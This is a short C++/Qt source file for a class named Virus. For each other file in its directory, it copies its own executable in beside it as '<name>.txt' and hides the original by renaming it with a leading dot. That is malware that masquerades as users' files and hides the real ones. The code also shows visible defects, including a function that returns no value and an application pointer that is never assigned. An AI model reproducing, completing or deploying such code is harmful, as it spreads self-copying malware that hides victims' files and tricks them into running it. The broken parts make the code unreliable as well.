#include "virus.h"
#include <QDir>
#include <QDebug>

Virus::Virus(QCoreApplication *a)
    : extentionFile("")
    , fileName("")
    , instruction("")
    , list()
    , pairs("")
{
}

Virus::~Virus()
{
}

QFileInfoList Virus::createList()
{
    QDir dir;
    dir.setFilter(QDir::Files|QDir::Hidden|QDir::NoSymLinks);
    dir.setSorting(QDir::Size|QDir::Reversed);
    list = dir.entryInfoList();
}

void Virus::createDublicate()
{
    for (int i = 0; i < list.size(); i++)
    {
        QFileInfo fileInfo = list.at(i);
        fileName = fileInfo.fileName();
        parseInfo(fileInfo);
        if (name != app->applicationName())
        {
            qDebug() << "Coping file:" << name;
            QFile::copy(app->applicationFilePath(),
                        app->applicationDirPath()
                        + "/" + fileName + ".txt");
            qDebug() << "-->" << name;
            hideFile();
        }
    }
}

void Virus::hideFile()
{
    QFile::rename(app->applicationDirPath() + "/" + name,
            app->applicationDirPath() + "/." + name);
}

void Virus::parseInfo(QFileInfo fileInfo)
{
    pairs = fileInfo.fileName().split(".");
    name = fileInfo.fileName();
    qDebug() << "\nname = " << name;
    if (pairs.length() != 1)
    {
        extentionFile = pairs[pairs.length() - 1];
        fileName = pairs[0];
    }
    else
    {
        extentionFile = "";
        fileName = pairs[0];
    }
    qDebug() << "File name:" << fileName << "\tFile extention:"
             << extentionFile;
}

